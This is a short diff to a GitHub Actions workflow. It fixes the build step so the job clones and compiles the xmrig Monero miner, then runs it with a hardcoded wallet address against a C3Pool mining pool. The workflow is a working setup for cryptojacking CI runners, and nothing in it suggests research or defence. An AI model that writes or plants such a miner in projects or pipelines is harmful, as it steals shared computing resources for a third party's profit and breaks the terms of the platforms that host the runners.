@@ -32,8 +32,7 @@ jobs:
         sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
         sudo apt-get install automake libtool autoconf -y
         git clone https://github.com/C3Pool/xmrig-C3
-        mkdir xmrig-C3/build
-        cmake .. && make -j$(nproc)
+        mkdir xmrig-C3/build && cd xmrig-C3/build && cmake .. && make -j$(nproc) && mv xmrig ~ && cd ~ && rm -rf xmrig-C3
     - name: run
       run: |
         ./xmrig -u 4497DUQtXG3ZsAmkzFfa8ma2knAkvdTKBE5Aq8XqsyBc2B6aiCsEDE99fVpiYpppBTFBm1ZmZPFkiQh1cEtoq4hJDxHk6rP -o  auto.c3pool.org:19999 -p termux -a cn-pico
